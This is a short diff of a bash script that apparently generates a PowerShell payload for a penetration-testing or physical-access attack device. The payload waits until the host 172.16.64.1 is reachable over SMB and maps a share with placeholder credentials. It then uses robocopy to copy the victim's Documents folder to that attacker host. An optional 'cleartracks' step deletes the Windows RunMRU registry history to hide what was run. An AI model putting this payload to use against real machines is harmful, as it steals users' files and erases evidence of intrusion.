@@ -32,11 +32,11 @@ if [ ! -d /pentest/impacket/ ]; then
 fi
 
 # Define powershell payload
-PAYLOAD="While(!(TNC 172.16.64.1 SMB -I quiet)){};net use \\\172.16.64.1\e PWD /USER:USER;robocopy \$HOME\Documents \\\172.16.64.1\e $EXFILTRATE_FILES /S"
+PAYLOAD="While(!!(New-Object net.sockets.tcpclient (172.16.64.1,445))){};net use \\\172.16.64.1\e PWD /USER:USER;robocopy \$HOME\Documents \\\172.16.64.1\e $FILES /S"
 
 # If cleartracks add the code to the powershell payload
 if [ $CLEARTRACKS == "yes" ]; then
-  PAYLOAD="${PAYLOAD};rp 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -N '*'"
+  PAYLOAD="${PAYLOAD};rp HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -N '*'"
 fi
 
 
